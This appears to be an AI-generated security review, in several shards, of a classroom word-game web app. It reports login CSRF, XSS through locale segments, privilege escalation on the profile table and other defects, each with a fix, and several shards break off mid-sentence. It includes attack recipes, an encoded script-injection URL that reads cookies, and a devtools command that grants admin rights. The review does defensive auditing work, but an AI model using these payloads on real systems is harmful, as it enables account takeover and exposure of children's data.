# deep_review — ohadf2015/boggle-new

Generated 2026-10-18T23:08:52.867Z by company-brain claude-burn (claude-opus-5-5), $32.05.

Metric hypothesis: an opus pass finds defects the sonnet pass missed. Success: >=1 finding not in the sonnet report and approved.


## Shard 0

# Security and architecture review: findings the previous pass missed

**Scope.** I read only the files in this batch: the auth callback, the classroom-game route, the classroom-addon routes, the two dictionary workflows, the admin wrappers, and some marketing pages. I did not repeat anything the previous pass already reported, such as the open `next` redirect, the es/ru locale regex, the 1.6 s pre-poll, admin gating, or copy drift.

**Findings are ordered by severity.** Anything that depends on code I couldn't see is marked **verify**.

---

## 1. Forced sign-in into an attacker's account through hash tokens (login CSRF) — **High**

**Where:** `fe-next/app/[locale]/auth/callback/PageClient.tsx:444-471`, plus `:486-490`

**How it breaks:**
1. The attacker signs into their own LexiClash account and copies their `access_token` and `refresh_token` from browser storage.
2. They send a teacher the link `https://www.lexiclash.live/en/auth/callback#access_token=…&refresh_token=…`, framed as "try this class game".
3. The teacher isn't signed in, so the existing-session loop at `:328-339` finds nothing. There is no `?code`, so the PKCE branch is skipped.
4. Line 452 calls `supabase.auth.setSession(...)` with the attacker's tokens. Nothing checks that this browser actually started a sign-in. There is no nonce or `state`.
5. The teacher is now silently signed in as the attacker, and the refresh token makes the session long-lived.
6. From then on, everything the teacher does lands in the attacker's account:
   - classes they create
   - pasted rosters (student names)
   - student progress
   - a Pro purchase they make

   The attacker can read all of it from their own session. This is student PII leaking to a third party.

PKCE codes can't be replayed like this, because the code verifier lives in the victim's storage. The hash branch bypasses PKCE entirely.

**A smaller leak in the same file:** lines `:486-490` log `window.location.href`, but only `code=` is redacted. The hash, including `access_token` and `refresh_token`, is logged untouched whenever the hash path falls through without a session. If `logger.warn` ships to Sentry, tokens end up there.

**Fix:**
- If every flow is PKCE now (magic links and OAuth), delete the hash branch.
- Otherwise, write a random nonce to `sessionStorage` when sign-in starts. Accept hash tokens only if that nonce exists, then clear it.
- Redact `location.hash` in the log entirely.

---

## 2. The "Try again" button races an in-flight code exchange and signs out every tab — **Medium** (sign-in funnel)

**Where:** `auth/callback/PageClient.tsx:24-25`, `:158-163`, `:385-389`, `:117-122`, `:493-511`

**How it breaks** (a teacher on slow school Wi-Fi):
1. The retry button appears at 6 s (`RETRY_TIMEOUT_SECONDS`). The code exchange is allowed to run for up to 15 s (`CODE_EXCHANGE_TIMEOUT`), and it only starts after the roughly 1.6 s pre-poll. So for the window between about 6 s and 16.6 s, the UI says "taking too long" while the exchange is still legitimately running.
2. The teacher taps Retry. `clearSupabaseAuthData()` deletes every `sb-*` cookie and every `supabase` localStorage key. That includes the PKCE code verifier, and it also signs out the teacher's other open tabs, because storage is shared.
3. `handleRetry` navigates with `router.replace` directly. It never sets `hasNavigated.current = true` (comp

## Shard 1

# Security and architecture review: education landing slice

## Scope

The six files in this pass are static marketing copy plus three locale resolvers. They contain no auth, billing or write paths. The previous pass already covered the copy contradictions in these files: the 50-student cap, student accounts, "hasta 30", the offline claim, which reports are Pro, the missing RU, and the `GEO_ANSWER` normalization.

What it missed is how these pages handle an untrusted `[locale]` URL segment, plus one privacy problem in the copy. That gives four findings. Findings 1–3 share a single root cause and a single fix, described at the end.

---

## 1. Locale strings like `constructor` and `toString` crash the page with a 500

**Where**
- `fe-next/app/[locale]/education/games-for-teachers/content.ts:523`
- `fe-next/app/[locale]/education/end-of-year-classroom-activities/content.ts:969,979`
- `fe-next/app/[locale]/education/games-for-teachers/landing.ts:79`
- `fe-next/app/[locale]/education/vocabulary-games-classroom/classGames.ts:565`

**Failure scenario**
1. A request arrives for `/constructor/education/games-for-teachers`. This assumes nothing upstream rejects unknown locales, which no earlier shard could confirm.
2. In `getGamesForTeachersContent`, `'constructor' in contentMap` is **true**, because `in` also checks the prototype chain. The guard passes and the function returns the `Object` constructor as the content.
3. `landing.ts:76` reads `c.heroH1.part1`, which throws a `TypeError`. The visitor gets a 500.
4. `end-of-year` behaves the same way: `MAP['constructor'] ?? EN` returns a function, which is not nullish, so the template throws. The same happens with `toString`, `valueOf`, `hasOwnProperty` and `__proto__`.
5. `GEO_ANSWER[locale]` and `SECTIONS[normalized]` use the identical pattern.

**Severity:** Low–Medium. Anyone can trigger 500s on the education pages without logging in, and crawlers can index those failing URLs. It also produces error-rate noise that hides real failures.

**Fix**
- Replace `in` and bare indexing with `Object.hasOwn(map, key)`, or switch these maps to `Map`.
- Better: fix the root cause described at the end.

---

## 2. Possible reflected XSS through the raw locale in JSON-LD, then cached by ISR

**Where**
- `fe-next/app/[locale]/education/games-for-teachers/landing.ts:108-113`, where the `url` is built from the raw `locale`.
- `page.tsx:9`, which sets `revalidate`.

**Failure scenario**
1. An attacker sends a teacher a link like `https://www.lexiclash.live/%3C%2Fscript%3E%3Cscript%3E…%3C%2Fscript%3E/education/games-for-teachers`.
2. Next decodes the dynamic param. `getGamesForTeachersContent` finds no match and **falls back to English**, so the page renders normally. Earlier passes only said "confirm locale is whitelisted". This step is what makes the sink reachable on a page that renders successfully.
3. `educationCourseJsonLd` builds `url: https://www.lexiclash.live/</script><script>…`. If that JSON-LD is written with `dangerouslySetInnerHTML={{ __html: JSON.stringify(...) }}`, the `</script>` sequence is not escaped. `JSON.stringify` escapes quotes but not `<`, so the attacker's script runs on your main domain.
4. Supabase JS keeps the session in `localStorage` on that origin. The attacker can steal the token of a teacher or an admin.
5. `revalidate = 86400` caches the poisoned render for 24 hours at that URL.

**Severity:** High if confirmed. It is unverified because I can't see `educationCourseJsonLd` or the template's JSON-LD writer.

**How to verify:** `curl` the encoded URL and grep the response for an unescaped `</script><script>`.

**Fix**
- Add one `safeJsonLd(obj)` helper that runs `JSON.stringify(obj).replace(/</g, '\\u003c')`.
- Use it in every JSON-LD writer. Earlier passes flagged the same pattern on the about, anagram and daily pages.
- Also validate the locale, as described in the fix at the end.

---

## 3. Unbounded ISR cache and crawl surface keyed on arbitrary locale strings (breaks at 10x)

**Where**
- `fe-next/app/[locale]/education/end-of-year-classroom-activities/page.tsx:9,15-23`
- `fe-next/app/[locale]/education/games

## Shard 2



## Shard 3

# Deep review: what the previous pass missed

**Scope.** This covers the files in this batch only. I left out anything the earlier shards already reported:

- the ratify double-pay race
- bulk-approve overwriting `likes_count`
- the Hebrew "no premium" FAQ on the substitute-teacher page
- Recent Activity rendering outside `ProGate`
- the stale student name on the reports page

There are eight findings, ordered by severity. Each one is tagged **confirmed** (visible in these files) or **verify** (it depends on code I can't see).

---

## 1. Ratify fails open: a malformed or unknown `decision` ratifies the proposal and pays out (confirmed)
**`fe-next/app/api/admin/curator-proposals/[id]/ratify/route.ts:39, 60`**

**How it fails:**
1. Line 39 is `request.json().catch(() => ({}))`. A body that fails to parse becomes `{}`.
2. Line 60 treats only the exact string `'reject'` as a rejection. Every other value falls through to the ratify path: an empty body, `'rejected'`, `'Reject'`, or a future value like `'defer'`.
3. An admin clicks **Reject**. If the client sends a slightly different string, or the body is lost (wrong `Content-Type`, an aborted stream, a proxy stripping it), the server runs the ratify path instead:
   - the word is promoted into `word_scores` (`:74`)
   - curator points are bumped
   - coins are awarded (`:127`)
   - the proposal is marked `ratified`
4. The response says `status: 'ratified'`. A UI that only checks `ok: true` shows nothing wrong.

**Severity:** Medium-high. The bad path writes into the master dictionary and pays coins, and it is the default branch.

**Fix:** Parse strictly. Return 400 unless `decision` is exactly `'ratify'` or `'reject'`, and return 400 when the JSON is invalid.

---

## 2. The reward path trusts failed reads: points can be wiped, and payouts happen for no-ops (confirmed)
**`ratify/route.ts:74, 84-104, 110-123, 125-138`**

**Scenario A: a transient error wipes prestige points.**
1. The `.single()` read of `curator_language_assignments` (`:110-115`) times out or errors. `error` is never read, so `assignment` is `null`.
2. `currentPoints` becomes `0` (`:116`).
3. `reward.newPoints` is then computed from 0 and written as an **absolute value** (`:119-123`).
4. A curator with 2,000 points ends up with only this one reward. Nothing logs the loss.

**Scenario B: a revoked curator still gets paid.**
1. An admin revokes a curator, and the assignment row is deleted or deactivated.
2. The curator's pending proposals are still `proposed`.
3. Ratifying one of them updates 0 rows of points, but `awardCoinsServer` still pays (`:127`).

**Scenario C: the proposal has no effect, but the curator is rewarded anyway.**
- For `puzzle_verdict`, if the puzzle lookup (`:84-88`) returns nothing, nothing is applied. That covers a deleted puzzle or a bogus `target_ref` supplied by the curator. The proposal is still marked `ratified` and paid.
- For `word_approve`, the result of `promoteWordToScores` (`:74`) and the `invalid_word_submissions` update (`:78-82`) are never checked.

**Severity:** Medium. It causes silent loss of curator reputation data and leaks money to people outside the program.

**Fix:**
- Check `error` on every read.
- Return 409 if the assignment row is missing or inactive.
- Return 409 if the effect target doesn't exist.
- Bump points with an atomic increment (an RPC doing `curator_points = curator_points + $n`), not read-then-write.
- Award the reward only after the effect write has succeeded.

---

## 3. Unescaped `locale` goes into inline JSON-LD, a possible XSS on your domain (verify, high if it reproduces)
**`fe-next/app/[locale]/student/profile/layout.tsx:20, 89, 95-147`** and **`fe-next/app/[locale]/substitute-teacher-word-games/page.tsx:75-77, 89-90`**

**How it would fail:**
1. Both files put the raw `locale` route param into objects that are rendered with `dangerouslySetInnerHTML={{ __html: JSON.stringify(...) }}`.
2. `JSON.stringify` does not escape `<`, `>` or `/`.
3. Suppose a request like `/%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E/student/profile` reaches the layout with the param decoded. The string `</script>` inside the JSON closes the tag, and the attacker's script runs on `www.lexiclash.live`. That puts Supabase sessions and teacher accounts at risk.
4. Contrast `word-games-for-the-classroom/jsonld.ts:19`, which normalizes the locale to a whitelist first. These two files skip that step.

**Also on the substitute page:** it has `revalidate = 86400` and no `generateStaticParams`. Every junk locale therefore renders a page and gets stored in the ISR cache, so a bot can grow the cache without limit.

**What to check:** Whether the proxy/middleware rejects unknown locale prefixes before the request reaches the route. Earlier shards flagged "check locale is whitelisted" as a footnote. These two files are concrete sinks. A single curl request against production will settle it.

**Fix:**
- In `app/[locale]/layout.tsx`, call `notFound()` for any locale not in the supported list. That fixes every page at once.
- Add one `safeJsonLd()` helper that replaces `<` with `\u003c`, and use it everywhere JSON-LD is inlined.

---

## 4. Classroom pages trust the classroom id in the URL, with ownership left to RLS only (verify)
**`teacher/classroom/[id]/analytics/page.tsx:52-54`**, **`analytics/PageClient.tsx:66, 84-90`**, **`teacher/reports/PageClient.tsx:59-60, 142`**

**How it would fail:**
1. `TeacherGate` checks that the visitor is *a* teacher. It does not check that they own the class.
2. The `id` and `classroomId` URL params go straight to `getClassroom`, `getClassroomStudents`, and a realtime subscription with `enabled: true`.
3. Classroom UUIDs show up in shareable URLs, such as `/teacher/reports?classroomId=…`, report links and screenshares.
4. Teacher B pastes teacher A's classroom id into the analytics URL.
5. Whether B then sees A's students' names and live activity depends entirely on:
   - RLS on the progress and roster tables
   - whether `useRealtimeClassroomProgress` uses `postgres_changes` (which RLS filters) or Broadcast or Presence (which RLS does not filter unless you use private channels)

**What to check:** Those RLS policies, and how the realtime hook subscribes.

**Severity:** Medium if the data leaks. These are minors' names and activity, and you can't verify the boundary from the client.

**Fix:**
- Assert ownership on the server before rendering, for example with an RPC like `assert_classroom_teacher(classroom_id)`.
- Move realtime to private channels with policies on `realtime.messages`.

---

## 5. The two word-approval paths diverge, so "approved" means different things (confirmed divergence; effect needs verifying)
**`api/admin/invalid-words/bulk-approve/_handlers.ts:109-157`** compared with **`ratify/route.ts:73-82`**

| Side effect | Bulk approve | Curator ratify |
|---|---|---|
| `word_scores` write | Inline upsert. Overwrites likes, dislikes and `first_submitter`. | `promoteWordToScores` |
| `invalid_word_submissions` update | By `id` (one row) | By `word + language` (all rows) |
| Removed from `bot_word_blacklist` | Yes (`:144`) | **No** |
| Optional in-memory dictionary add | Yes (`:151`) | **No** |

**How it fails:**
1. A curator proposes a Hebrew word, and an admin ratifies it.
2. Bots stay blacklisted from that word.
3. The running dictionary won't accept it until the server reloads, if it reads from memory.
4. Players and the curator see an "approved" word still being rejected, which undermines the curator program.

**Fix:** Write one server-side `approveWord(word, lang, actor)` function that covers scores, the submission row, the blacklist and the dictionary. Call it from both routes.

---

## 6. `addToDictionary` changes only one process's memory and will break when you add a second instance (verify)
**`bulk-approve/_handlers.ts:151-157`**, and the loop at `:87-167`

**How it fails:**
1. The API handler does `import('@/backend/dictionary')` and then `addApprovedWord(...)`. If that function updates an in-memory dictionary, only the process that handled this HTTP request learns the word.
2. When you scale out (more than one Node instance, or the socket game server running separately), the other instances never see it. Any restart loses it too, unless the function also persists the word.
3. Separately, the loop processes up to 100 words one at a time, with 3-4 database round trips each plus the dynamic import. That is roughly 300-400 sequential calls, about 10-15 s at typical latency.
4. A proxy or function timeout partway through leaves a partial approval, and the admin gets a generic error with no per-word results.

**What to check:** Whether `addApprovedWord` persists anything. You already run Redis (from the classroom code), so use it for the broadcast.

**Fix:**
- Persist approvals to the database as the source of truth.
- Publish a `dictionary:add` message on Redis pub/sub, and have every instance apply it.
- Batch the `word_scores` upsert and the `invalid_word_submissions` update into one call each.

---

## 7. The "public money path" on `/teacher` reaches almost nobody (confirmed design; verify redirect timing)
**`app/[locale]/teacher/page.tsx:10, 21`**, **`teacher/PublicTeacherPayCta.tsx:10-14`**

**How it fails:**
1. The comment says the CTA exists because "crawlers and share-traffic never saw Teacher Pro".
2. Crawlers: the page sets `noIndex: true` (`page.tsx:10`), so it never ranks.
3. Signed-out humans: `TeacherGate` redirects them to `/education/access` on the client, so they see the CTA for under a second.
4. Signed-in Pro teachers: while auth is loading, the CTA renders under the dashboard and then disappears. They briefly see "buy Pro" even though they already pay.

**Severity:** Medium for a first-revenue goal. This is a checkout surface that converts no one.

**Fix:**
- Put `TeacherProCheckoutCta` on `/education/access`, which is where the gate actually sends signed-out visitors.
- Alternatively, have `/teacher` render a pricing page for signed-out visitors instead of redirecting them.
- Hide the CTA until `loading` is false.

---

## 8. Achievement progress mixes a hardcoded tier order with the database's order (confirmed logic; impact depends on data)
**`student/profile/achievementTransform.ts:3, 28-38`**

**How it fails:**
- `TIER_ORDER` hardcodes bronze to platinum as 1-4 and compares that with the database's `tier_order`.
  - If the database numbers tiers from 0, a bronze student's "next tier" skips silver.
  - Any tier name not in the map (for example a new `diamond`) maps to 0.
- If `achievement_tiers` didn't come back from the join, or `nextThreshold` is 0, `percentComplete` is set to **100**. A locked achievement with zero progress then shows as complete.

**Severity:** Low. It is a student-facing data-integrity issue.

**Fix:**
- Find the current tier's row in `tiers` by name.
- Set next tier = the smallest `tier_order` above it.
- Return 0% when there is no tier data, not 100%.

---

**Lower, not ranked:** `teacher/PageClient.tsx:127` freezes `nowMs` when the component mounts. On a Teacher HQ that stays open on a projector across days, the day-10 trial-expiring banner and the days-left count go stale. That is a missed nudge at the moment of conversion. Fix it by recomputing `nowMs` on an interval or when the tab regains visibility.

## Shard 4

# Deep review: what the previous pass missed

I checked every server file in this batch against the 43 earlier shards. Findings the earlier pass already made are excluded: curator ratify, Wikipedia bulk-approve, the Polar cron ledgers, churn watch, the blast lost-updates, CSV injection, funnel `.in()`, guest join creating orphan accounts, and the `canAddStudent` race. Ten findings remain, most severe first. I couldn't see RLS policies, `checkApiRateLimit`, `signParentReportToken` or the client callers, so I mark any inference that depends on them.

---

### 1. The join endpoint is an unthrottled code oracle that enrolls, so a class's seats can be filled by a script
**`fe-next/app/api/education/classroom/join/route.ts:46-96, 129-160, 220-239`**, compared with `classroom/preview/route.ts:38-44`

**Severity:** High. This is a classroom of minors, and the attack denies service during a live lesson.

**Failure scenario:**
1. `preview` is rate-limited because a 6-character code is an "enumeration oracle" (its own comment). `join` takes the same code, runs the same `lookup_classroom_by_join_code` RPC, and has no rate limit.
   - A wrong code returns 400 and a right one returns 200.
   - A hit doesn't just reveal the class. It enrolls the caller permanently.
   - The preview limit protects nothing while join stays open.
2. Join also accepts the live game code (`:154-160`). Anyone with a photo of the projector, or a stream of the lesson, becomes a permanent roster member. They then see the class leaderboard and hub.
3. Seat exhaustion:
   - Each guest request with a fresh `guestName` mints a new anonymous user (`:60`).
   - Each one passes the `existing` check and consumes a seat (`:220-239`).
   - About 50 requests fill a free class.
   - Real students then get `STUDENT_LIMIT_REACHED` in the middle of the lesson.
   - The teacher has no way to tell who the ghosts are.

**Fix:**
- Rate-limit join per IP and per code, using the same budget as `preview`.
- Validate the code and resolve the classroom before `signInAnonymously` (the earlier pass suggested the reorder for a different reason).
- Do not auto-enroll from a live game code. Grant a session-scoped seat instead, and make roster enrollment require the roster code or teacher approval.
- Give the teacher a "remove student / regenerate code" action if one doesn't exist.

---

### 2. Requests are authenticated with the Bearer token but run their queries as the cookie session
**Where:**
- `adventure/progress/route.ts:31-37, 46-69`
- `blast/progress/route.ts:38-40` with `_handlers.ts:33-52`
- `classroom/create/route.ts:29, 68-77`
- `classroom/join/route.ts:46, 126, 199-204, 234-239`

**Severity:** High/Medium. Players see progress silently reset, and teacher onboarding fails.

**The trust split:**
- `getAuthedUser` verifies the Bearer JWT, which `fetchWithAuth` sends precisely because "cookie session can be stale" (`ownedClassroomRoute.ts:21`).
- The route then calls `createClient()`, which uses the cookie session.
- RLS therefore evaluates a different identity from the one that was authenticated: anonymous, expired, or another account on a shared device.

**Failure scenario (adventure):**
1. The cookie has expired and the Bearer token is valid.
2. `.eq('user_id', userId)` under the anonymous role returns 0 rows, which surfaces as `PGRST116`.
3. Line 64 treats that as a new player and returns 200 with level 1 and no completions.

**Blast:** `_handlers.ts:33-52` ignores the `.single()` error entirely and returns default level 1 with status 200. Any DB error is indistinguishable from a new player.

**Create and join:** the insert with `teacher_id`/`student_id` set to the Bearer user is rejected by RLS under the cookie identity. The teacher gets "Failed to create classroom" (500) on the first step of the paid funnel.

**Fix:**
- Build the request client from the verified token: `createClient` with `global.headers.Authorization = Bearer <token>`.
- Alternatively, use the service-role client with explicit `user_id` filters after verification.
- Never return "fresh state" on a read error. Return 500, so the client doesn't treat the empty result as truth.

---

### 3. Teacher access can't be revoked, and approve/decline have no state-transition guards
**`admin/teacher-access/[id]/approve/route.ts:19-33, 47`** and **`decline/route.ts:17-29`**

**Severity:** Medium. This is an authorization gap.

**Failure scenario:**
1. The admin approves a request, so `profiles.user_role='teacher'` is set through the service role. For emails with no account yet, an allowlist row is inserted instead.
2. The admin later declines the same request (wrong person, abuse report, typo approval). Decline only flips `status`. The role stays `teacher` and the allowlist row stays redeemable. The person is emailed "declined" while keeping full teacher access.
3. Neither route checks the current status. Neither asserts that the `teacher_access_requests` update touched a row. This is the same "RLS silently matches zero rows" trap the approve comment documents for `profiles`.
4. If that table's update policy lacks an admin bypass, approve promotes the role while the request still reads `pending`.
5. Decline's `sendEmail` can throw after the DB write. That returns 500, the admin retries, and a second email goes out.

**Fix:**
- Make both updates conditional: `.eq('status', 'pending').select('id')`, and require one row back.
- Add a real revoke path: demote `user_role`, delete the allowlist row, and end any trial.
- Wrap the decline email the way approve does.

---

### 4. Missed-practice idempotency is keyed on client-supplied text and is check-then-act
**`education/classroom/[id]/missed-practice/route.ts:49-58, 65-68, 71-92`**

**Severity:** Medium. This is a Pro feature, and the result is duplicate homework for students.

**How the "already assigned today" guard works:** it checks whether a lesson exists whose name equals `names[0]`. `names` comes from the request body.

**Failure scenarios:**
- **Double-click or retry:** both requests read "no lesson" and each creates 3 lessons and 3 assignments. Students get 6 due rounds. There is no unique constraint to stop this.
- **Different locale or wording on the same day:** the names differ, so the duplicate is allowed.
- **Names without a date:** if the client's names are not date-stamped, the teacher gets 409 forever after the first use.
- **Partial rollback:**
  - Rollback deletes the lessons but not the `lesson_assignments` rows already inserted. That leaves orphan assignments unless the FK cascades (unverified).
  - The delete's error is ignored.

**Fix:** derive the key on the server as `(classroom_id, today, 'missed-practice')`, with a unique index or a marker row. Do the three lesson-and-assignment pairs in one RPC or transaction.

---

### 5. Rate limits are per process and per IP, and guest sign-ups share one server IP (breaks at 10x)
**Where:**
- `classroom/live-game/route.ts:42-48`
- `preview/route.ts:38`
- `verify-crazygames/route.ts:42`
- `join/route.ts:60`

**Severity:** Medium. This hits real schools at scale.

**Failure scenarios:**
- **Per-process limits.** `checkApiRateLimit` is synchronous, so its state is in-process (inferred).
  - Scaling to N instances multiplies the enumeration budget by N.
  - Every deploy or restart resets it.
- **Shared school IPs.**
  - A school whose three classes start at 9:00 behind one NAT sends about 90 lobby loads.
  - `live-game` allows 60 per minute per IP, so it returns 429.
  - Those students' lobbies fall back to defaults and announce Classic during a Vocab Quiz. That is the exact bug this route was written to fix.
- **Guest sign-ups from one IP.**
  - `signInAnonymously()` runs server-side, so Supabase Auth sees your server's IP for every guest in the product.
  - Supabase's per-IP anonymous sign-in limit (default 30/hour; check your project setting) therefore acts as a global cap.
  - One 31-student guest class, or the script from #1, blocks guest joins everywhere.

**Fix:**
- Move the limiter to Redis (you already run it for cron locks), keyed by code plus IP.
- Raise the per-IP budgets for school routes.
- Check and raise the anonymous sign-in limit in Supabase now.

---

### 6. The weekly digest puts every classroom and assignment UUID in the URL (breaks at 10x)
**Where:**
- `cron/teacher-weekly-digest/route.ts:83-86, 99-102, 110-116, 132-136, 158-164, 182-185, 207-211`
- The same pattern in `teacher-polar-trial-day10/route.ts:82-98` and `teacher-polar-trial-expiry/route.ts:118-122`

**Severity:** Medium.

**Failure scenario:**
1. At a few hundred classrooms, or up to 2000 assignment ids at about 37 bytes each, the `.in(...)` GET exceeds PostgREST or proxy URL limits.
2. The classrooms, memberships and sessions branches `throw`, so no teacher gets a digest that Monday.
3. The completions branch only logs, so the digest goes out showing 0% completion.
4. The earlier pass flagged only the funnel route's `.in()` and the `limit(5000)`.

**Fix:** chunk ids into batches of about 100, or move each aggregate into an RPC that joins on the server.

---

### 7. The admin drill-down probably shows every teacher as "free"
**`admin/teacher-funnel/[userId]/details/route.ts:146-160`**

**Severity:** Low/Medium. It gives the founder a wrong view of who is paying.

**Failure scenario:**
1. This file's header warns that reading another user's rows through the request client returns nothing because of RLS.
2. `checkTeacherSubscription(userId)` is called without the service-role client, and its own comment says it "falls back to a request-scoped client".
3. If `subscriptions` RLS is own-row (likely, but unverified), every teacher reads as `free`.
4. Separately, `hasPro` excludes `trialing`, so trial teachers also show as free.

**Fix:** pass the `supabase` admin client into `checkTeacherSubscription`, and count `trialing` as Pro, or show it as its own state.

---

### 8. The admin mutation routes have no same-origin check
**Where:**
- `teacher-access/[id]/approve/route.ts:8-17`
- `decline/route.ts:6-15`
- `resend/route.ts:10-19`

**Severity:** Low. It depends on cookie `SameSite`.

**Failure scenario:**
1. `curator/propose` rejects cross-origin POSTs (`:24-26`) because it authenticates with an ambient cookie. The approve route, which grants a role, does not.
2. `req.json()` also parses `text/plain` bodies, so a simple form POST works.
3. If the auth cookie is ever `SameSite=None`, which embedded contexts such as CrazyGames or a Classroom add-on iframe tend to push you towards:
   - An attacker submits an access request.
   - They lure the founder to a page that auto-POSTs `/api/admin/teacher-access/<id>/approve`.
   - The attacker gets teacher access, and with it access to minors' data.

**Fix:** add `isSameOrigin(request)` to every admin and teacher POST, and require `content-type: application/json`.

---

### 9. Parent-report links can't be revoked
**`education/classroom/[id]/members/[studentId]/parent-report/route.ts:87-95`**

**Severity:** Medium/Low (unverified). The stakes are high because the data is about a child.

**Failure scenario:**
1. The token is stateless, with "no DB row backs the link".
2. A teacher shares a report and the link gets forwarded, for example in a custody dispute or a class group chat.
3. Nothing can kill it. Removing the student, losing Pro, or rotating anything short of `PARENT_REPORT_SECRET`, which kills every link, leaves it working.
4. I couldn't see whether `signParentReportToken` sets an expiry. If it doesn't, the link lives forever.

**Fix:** add `exp` (for example 30 days) and a per-membership `report_nonce` column embedded in the token. On view, also check that the membership still exists and the teacher still has Pro.

---

### 10. CrazyGames verify establishes no server identity and turns bad tokens into 500s
**`auth/verify-crazygames/route.ts:82-87, 89-103`**

**Severity:** Low.

**Failure scenarios:**
- **No server identity.** The route returns `{userId}` as plain JSON and binds nothing: no session, no signed cookie, no stored mapping.
  - Any other endpoint that later trusts a client-relayed CrazyGames `userId` is spoofable.
  - The header says "establish a trusted identity on the server", which this route doesn't do. I couldn't see any consumer.
- **Wrong error classification.** The classifier matches substrings of the error message.
  - jose's audience failure (`unexpected "aud" claim value`), algorithm rejection and `no applicable key found` contain none of the matched strings.
  - A token from another CrazyGames game therefore returns 500 and creates a Sentry event, instead of returning 401.

**Fix:**
- Check `err instanceof errors.JOSEError` (or use `err.code`) and return 401.
- Have the route mint something the rest of the server can trust, such as a signed session cookie or an upserted identity link.

---

**Priority for first revenue:** fix #2 first, because it can 500 a teacher's first classroom create. Then fix #1 and #5 before any school pilot with more than one class. #3 and #4 are each about an hour of guards and constraints.

## Shard 5

# Senior review: what the previous pass missed

These ten findings are new. None of them repeats the earlier list (handshake-id spoofing, `createClassroomGame` overwrite, unbounded scores, chest race, hint charge, the miss-gap anonymous bypass and so on). They are ordered by severity. Where a finding depends on code I couldn't see, I say so.

---

## 1. `getLobbyUsers` lets anyone subscribe to any game room and read its roster
**`fe-next/backend/handlers/classroomGameHandler.ts:458-478`** · **High** (authz and minors' privacy)

**How it fails:**
1. Any socket emits `getLobbyUsers { gameCode }`. That includes a guest with no auth and no classroom membership. The handler has no `checkRateLimit`, no `getAuthUserId` and no membership check.
2. Line 462 runs `socket.join(getGameRoom(code))` on the bare code. The socket now receives every broadcast to `game:<code>`. Per the comments in this file set, that covers `updateUsers`, `classroomGameModeChanged`, `classroomGamePressureChanged` and `hostLeftRoomClosing`. Whatever else the game engine sends to that room is probably included too, such as the board and the found-word batches the projector shows.
3. Line 474 also returns the merged waiting and active roster (usernames and avatars) to the caller.
4. With no rate limit, a script can loop over codes. It harvests rosters, and an empty versus non-empty reply tells it which codes are live.
5. The codebase deliberately avoids exactly this oracle elsewhere. `classroomSeatGate.ts:92-95`, `classroomGameJoinGate.ts:24-36` and F-03/F-11 all reject unknown and ended codes identically and never probe membership. This listener skips all of that care. It also applies to ordinary private multiplayer rooms.

**Fix:**
- Require `getAuthUserId(socket)`.
- Only answer the classroom's teacher, or a socket already bound to that game (`getGameBySocketId(socket.id) === code`).
- Do not `socket.join` here. The teacher already joins at line 152.
- Add `checkRateLimit`.

---

## 2. Persistence lock is per game code for 24h, so only the first round of a session is ever recorded
**`fe-next/backend/handlers/classroomGamePersistence.ts:333, 348`** · **High** (data integrity on the paid analytics)

**How it fails:**
1. The idempotency key is `classroom_game_persisted:${game.gameCode}` with `EX 86400 NX`.
2. Classroom sessions are multi-round under one code. `classroomGameJoinGate.ts:10-13` says "`status: 'finished'` is written at the end of every round … the teacher presses 'next round' seconds to minutes later". `classroomRoundRecord.ts:2` promises "one row per completed classroom live round". `playerScoresFromGameResults` (`classroomRoundParticipants.ts:13-20`) feeds this function from the per-round server end path.
3. Round 1 ends. Rows are written and the key is held for 24h, because it is only released when 0 rows are written (`:588-594`).
4. Rounds 2…N end. Each one hits `!acquired`, logs "already persisted — skipping duplicate" and returns `[]`.
5. The teacher presses End (`classroomGameEndHandler.ts:175`). That call also returns `[]`, so the `rewards` broadcast is empty.
6. **Result:** for every session after round 1, the teacher's report, the students' `practice_sessions`, lesson progress, XP and the `classroom_rounds` rows are all silently missing.

I could not see `gameLifecycle/gameScores.ts`. Confirm it calls this function per round. Every comment around this code says it does.

**Fix:**
- Key the lock on the round: `classroom_game_persisted:${gameCode}:${gameSessionId}`. `roundIdOf` already exists in `classroomEconomyHandler.ts:38`.
- Make the teacher's End path persist only rounds that haven't been persisted yet.
- Back this with a DB unique constraint on (`classroom_id`, `game_code`, round id, `student_id`) in `practice_sessions`.

---

## 3. `profiles` is writable by the user's own session: check that privileged columns are protected
**`fe-next/app/api/education/teacher/activation/route.ts:39, 102-105`**, **`fe-next/app/components/ProfileCustomizationWrapper.tsx:60-64`** · **High if unprotected** (verify)

**How it fails:**
1. The activation route updates `profiles` with the cookie-scoped anon-key client (`createClient()` from `utils/supabase/server`), not service role. The profile modal does the same from the browser. RLS therefore allows a user to `UPDATE` their own `profiles` row.
2. The same table appears to hold privileged columns:
   - `is_admin`: the web-vitals admin check reads it.
   - `premium_avatar_parts`: chest rewards grant these.
   - The teacher role: the approve route needs service role to promote.
3. Unless a column-level grant or a `BEFORE UPDATE` trigger blocks those columns, any signed-in user, including an anonymous guest, can run this in devtools:
   ```js
   supabase.from('profiles').update({ is_admin: true, premium_avatar_parts: [...] }).eq('id', me)
   ```
   That makes them an admin of the client-gated admin pages and unlocks every premium cosmetic.

**Fix:**
- `REVOKE UPDATE ON profiles FROM authenticated`, then `GRANT UPDATE (display_name, avatar_config, has_customized_profile, <activation cols>, updated_at)`.
- Alternatively, add a trigger that rejects changes to privileged columns unless `auth.role() = 'service_role'`.
- Run one devtools test against production to confirm.

---

## 4. Word Tower progress stores an unbounded, unvalidated blob and client-claimed bests
**`fe-next/app/api/word-tower/progress/route.ts:26, 71, 84-88`** · **Medium** (storage abuse and leaderboard integrity)

**How it fails:**
1. `StateSchema` ends in `.passthrough()`, so unknown keys of any size survive validation.
2. `request.json()` (line 71) has no body-size check. App Router route handlers don't apply a 1 MB limit the way server actions do.
3. An anonymous account, which costs nothing to mint, POSTs 60 times a minute with multi-MB `current_state`. That bloats the row, DB storage and backups. The GET route then serves the blob back.
4. `best_height_m` and `best_floors` are taken straight from the client (up to 1e9). The trigger keeps values monotonic but cannot tell whether they are true, so any best or leaderboard built on this is self-reported.

**Fix:**
- Use `.strict()`, or strip unknown keys.
- Reject `content-length` above about 64 KB before parsing.
- Derive `heightM` and `floors` server-side from `state.floors` (sum of `meters`, count). Reject mismatches, and cap per-word meters.

---

## 5. Horizontal scale-out breaks the end-of-class score write and the lobby roster
**`classroomGameEndHandler.ts:154-158`**, **`classroomMissingRoom.ts:44, 129-141`** · **Medium now, High at 10x**

**How it fails:**
